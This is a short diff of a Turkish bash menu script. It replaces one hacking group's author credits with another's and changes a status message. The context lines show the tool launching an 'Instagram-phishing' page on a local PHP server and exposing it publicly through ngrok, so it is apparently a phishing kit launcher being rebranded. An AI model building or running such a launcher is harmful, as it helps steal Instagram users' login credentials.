@@ -1,8 +1,7 @@
 #!/bin/bash|
-#Code:Yaman Efkar
-#Türk Siber Timi
-#İnstagram : @turksibertimi
-#Youtube : YamanEfkar
+#Code:FR13NDS-MRX 
+#FR13NDS HACK GRUBU 
+#İnstagram : @72.memoli.72 
 
 clear
 
@@ -25,7 +24,7 @@ echo -e "\033[31;40;1m
 \e[31m[00]\e[37m Menü
 \e[31m[99]\e[37m Exit
 "
-echo -e "\033[32;40;1m                      ~~~Yaman Efkar~~~"
+echo -e "\033[32;40;1m                 ~~~FR13NDS-MRX~~~"
 echo ""
 read -p "İslem Numarası : " islem
 if [[ $islem == 1 || $islem == 01 ]]; then
@@ -33,7 +32,7 @@ if [[ $islem == 1 || $islem == 01 ]]; then
         echo -e "\e[32mCode: insta01"
 	sleep 2
 	echo ""
-	echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
+	echo -e "\e[33mİşlem Başlatılıyor..."
 	sleep 4
 	cd Instagram-phishing/
 	php -S 127.0.0.1:$port > -t & ngrok http $port
